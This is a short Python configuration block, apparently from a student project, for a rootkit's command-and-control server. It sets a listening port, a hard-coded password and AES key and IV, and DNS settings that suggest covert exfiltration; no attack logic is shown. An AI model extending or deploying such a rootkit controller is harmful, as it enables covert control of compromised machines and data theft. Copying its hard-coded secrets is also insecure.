import threading

# ------------------------------ CONFIGURATION ------------------------------ #

HOST = '0.0.0.0'
PORT = 4242
BUFFER_SIZE = 1024
PASSWORD = "epiroot"
UPLOAD_FOLDER = "uploads"
DOWNLOAD_FOLDER = "downloads"

AES_KEY = b'1234567890abcdef'  # 16 bytes = 128 bits
AES_IV = b'abcdef1234567890'   # 16 bytes = 128 bits

rootkit_connection = None
rootkit_address = None
last_response = ""
authenticated = False
connection_lock = threading.Lock()

# Structure pour garder une trace des commandes et de leurs sorties
command_history = []

# ----------------------------------- DNS ----------------------------------- #
 
DNS_PORT = 53
DNS_DOMAIN = "dns.google.com"
DNS_RESPONSE_TIMEOUT = 12.0
DNS_POLL_INTERVAL   = 0.2 
command_queue = []
exfil_buffer = {}
last_channel = 'tcp'
expected_chunks = None